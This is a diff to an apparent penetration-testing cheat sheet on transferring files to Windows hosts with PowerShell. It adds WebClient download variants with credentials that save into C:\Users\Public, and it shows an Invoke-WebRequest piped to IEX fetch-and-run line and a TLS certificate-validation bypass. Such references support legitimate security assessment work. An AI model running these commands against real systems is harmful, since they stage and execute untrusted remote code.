@@ -15,13 +15,26 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 <details> 
 <summary><strong>PowerShell DownloadFile Method</strong></summary>
 
-Sync  
+**Sync (Wait for the download to finish)**  
+
+No password
 ```powershell
-(New-Object Net.WebClient).DownloadFile('<FILE URL>','<OUTPUT FILE>')
+(New-Object Net.WebClient).DownloadFile('<FILE URL>','C:\Users\Public\<FILE>')
 ```
-Async  
+Using Credentials
 ```powershell
-(New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','<OUTPUT FILE>')
+(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('<FILE URL>', 'C:\Users\Public\<FILE>')
+```
+
+**Async (Keep using Powershell while downloading)**  
+
+No password
+```powershell
+(New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','C:\Users\Public\<FILE>')
+```
+Using Credentials
+```powershell
+(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('<FILE URL>', 'C:\Users\Public\<FILE>')
 ```
 
 </details>
@@ -56,7 +69,6 @@ Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
 ByPass SSL/TLS Error  
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-# Command to download the file
 ```
 </details>
 </details>
